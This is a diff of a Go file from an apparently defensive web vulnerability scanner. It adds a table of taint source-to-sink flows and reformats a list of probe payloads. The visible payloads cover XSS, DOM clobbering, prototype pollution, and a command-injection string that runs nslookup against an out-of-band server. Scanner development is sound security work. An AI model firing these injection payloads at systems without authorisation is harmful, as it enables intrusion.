@@ -1,7 +1,59 @@
-// internal/analysis/active/taint/probes.go
 package taint
 
 import "github.com/xkilldash9x/scalpel-cli/api/schemas"
+
+// TaintFlowPath defines a specific source-to-sink path for taint analysis.
+type TaintFlowPath struct {
+	ProbeType schemas.ProbeType
+	SinkType  schemas.TaintSink
+}
+
+// ValidTaintFlows defines the set of acceptable source-to-sink paths to reduce false positives.
+var ValidTaintFlows = map[TaintFlowPath]bool{
+	{schemas.ProbeTypeXSS, schemas.SinkEval}:              true,
+	{schemas.ProbeTypeXSS, schemas.SinkInnerHTML}:         true,
+	{schemas.ProbeTypeXSS, schemas.SinkOuterHTML}:         true,
+	{schemas.ProbeTypeXSS, schemas.SinkDocumentWrite}:     true,
+	{schemas.ProbeTypeXSS, schemas.SinkIframeSrcDoc}:      true,
+	{schemas.ProbeTypeXSS, schemas.SinkFunctionConstructor}: true,
+	{schemas.ProbeTypeXSS, schemas.SinkScriptSrc}:         true,
+	{schemas.ProbeTypeXSS, schemas.SinkIframeSrc}:         true,
+	{schemas.ProbeTypeXSS, schemas.SinkNavigation}:        true,
+	{schemas.ProbeTypeXSS, schemas.SinkPostMessage}:       true,
+	{schemas.ProbeTypeXSS, schemas.SinkWorkerPostMessage}: true,
+
+	{schemas.ProbeTypeDOMClobbering, schemas.SinkEval}:      true,
+	{schemas.ProbeTypeDOMClobbering, schemas.SinkInnerHTML}: true,
+	{schemas.ProbeTypeDOMClobbering, schemas.SinkNavigation}: true,
+
+	{schemas.ProbeTypeSSTI, schemas.SinkEval}:              true,
+	{schemas.ProbeTypeSSTI, schemas.SinkInnerHTML}:         true,
+	{schemas.ProbeTypeSSTI, schemas.SinkOuterHTML}:         true,
+	{schemas.ProbeTypeSSTI, schemas.SinkDocumentWrite}:     true,
+	{schemas.ProbeTypeSSTI, schemas.SinkIframeSrcDoc}:      true,
+	{schemas.ProbeTypeSSTI, schemas.SinkFunctionConstructor}: true,
+
+	{schemas.ProbeTypeSQLi, schemas.SinkInnerHTML}:       true,
+	{schemas.ProbeTypeCmdInjection, schemas.SinkInnerHTML}: true,
+
+	{schemas.ProbeTypeGeneric, schemas.SinkWebSocketSend}:     true,
+	{schemas.ProbeTypeGeneric, schemas.SinkXMLHTTPRequest}:    true,
+	{schemas.ProbeTypeGeneric, schemas.SinkXMLHTTPRequestURL}: true,
+	{schemas.ProbeTypeGeneric, schemas.SinkFetch}:             true,
+	{schemas.ProbeTypeGeneric, schemas.SinkFetchURL}:          true,
+	{schemas.ProbeTypeGeneric, schemas.SinkNavigation}:        true,
+	{schemas.ProbeTypeGeneric, schemas.SinkSendBeacon}:        true,
+	{schemas.ProbeTypeGeneric, schemas.SinkWorkerSrc}:         true,
+
+	{schemas.ProbeTypeOAST, schemas.SinkWebSocketSend}:     true,
+	{schemas.ProbeTypeOAST, schemas.SinkXMLHTTPRequest}:    true,
+	{schemas.ProbeTypeOAST, schemas.SinkXMLHTTPRequestURL}: true,
+	{schemas.ProbeTypeOAST, schemas.SinkFetch}:             true,
+	{schemas.ProbeTypeOAST, schemas.SinkFetchURL}:          true,
+	{schemas.ProbeTypeOAST, schemas.SinkNavigation}:        true,
+	{schemas.ProbeTypeOAST, schemas.SinkSendBeacon}:        true,
+	{schemas.ProbeTypeOAST, schemas.SinkWorkerSrc}:         true,
+}
 
 // DefaultProbes returns a comprehensive list of attack payloads for various vulnerability classes.
 // MODULARITY: This function now provides defaults, the Analyzer consumes the configuration object.
@@ -79,8 +131,8 @@ func DefaultProbes() []ProbeDefinition {
 			Description: "XSS by closing the current script tag and opening a new one.",
 		},
 		{
-			Type:        schemas.ProbeTypeXSS,
-			Context:     "JS_INJECTION",
+			Type:    schemas.ProbeTypeXSS,
+			Context: "JS_INJECTION",
 			// Template literal injection (ES6)
 			Payload:     "${" + executionProofCall + "}",
 			Description: "XSS within JS template literals (backticks).",
@@ -108,15 +160,15 @@ func DefaultProbes() []ProbeDefinition {
 
 		// -- DOM Clobbering/Interference --
 		{
-			Type:        schemas.ProbeTypeDOMClobbering,
-			Context:     "HTML_INJECTION",
+			Type:    schemas.ProbeTypeDOMClobbering,
+			Context: "HTML_INJECTION",
 			// Attempts to clobber 'window.someVar.enabled' and trigger execution if logic relies on it.
 			Payload:     `<a id=someVar><a id=someVar name=enabled href="javascript:` + executionProofCall + `">ClickMe</a>`,
 			Description: "DOM Clobbering (A/A) leading to potential logic bypass or XSS.",
 		},
 		{
-			Type:        schemas.ProbeTypeDOMClobbering,
-			Context:     "HTML_INJECTION",
+			Type:    schemas.ProbeTypeDOMClobbering,
+			Context: "HTML_INJECTION",
 			// Attempts to clobber 'window.settings.isAdmin' to true. (Does not execute JS, aims to disrupt logic).
 			Payload:     `<form id=settings><input name=isAdmin value=true></form>`,
 			Description: "DOM Clobbering (Form/Input) targeting configuration objects.",
@@ -124,23 +176,23 @@ func DefaultProbes() []ProbeDefinition {
 
 		// -- JavaScript Prototype Pollution --
 		{
-			Type:        schemas.ProbeTypePrototypePollution,
-			Context:     "JSON_PARSE_MERGE",
+			Type:    schemas.ProbeTypePrototypePollution,
+			Context: "JSON_PARSE_MERGE",
 			// Pollutes Object.prototype with 'scalpelPolluted' set to the canary.
 			// The JS shim detects this pollution.
 			Payload:     `{"__proto__":{"scalpelPolluted":"{{.Canary}}"}}`,
 			Description: "Prototype Pollution via __proto__ injection (Common).",
 		},
 		{
-			Type:        schemas.ProbeTypePrototypePollution,
-			Context:     "QS_PARSE_MERGE",
+			Type:    schemas.ProbeTypePrototypePollution,
+			Context: "QS_PARSE_MERGE",
 			// Pollution via query string format (common in URL params/hash).
 			Payload:     `__proto__[scalpelPolluted]={{.Canary}}`,
 			Description: "Prototype Pollution via __proto__ injection (Query String format).",
 		},
 		{
-			Type:        schemas.ProbeTypePrototypePollution,
-			Context:     "MERGE_CLONE",
+			Type:    schemas.ProbeTypePrototypePollution,
+			Context: "MERGE_CLONE",
 			// Pollution via constructor.prototype (sometimes bypasses filters).
 			Payload:     `{"constructor":{"prototype":{"scalpelPolluted":"{{.Canary}}"}}}` ,
 			Description: "Prototype Pollution via constructor.prototype injection.",
@@ -170,8 +222,8 @@ func DefaultProbes() []ProbeDefinition {
 			Description: "SSRF via HTTP URL injection.",
 		},
 		{
-			Type:        schemas.ProbeTypeOAST,
-			Context:     "BLIND_RCE_DNS",
+			Type:    schemas.ProbeTypeOAST,
+			Context: "BLIND_RCE_DNS",
 			// Attempts to execute nslookup/ping to trigger a DNS interaction.
 			Payload:     `; nslookup {{.Canary}}.{{.OASTServer}} #`,
 			Description: "Blind RCE (Linux) via command injection triggering DNS interaction.",
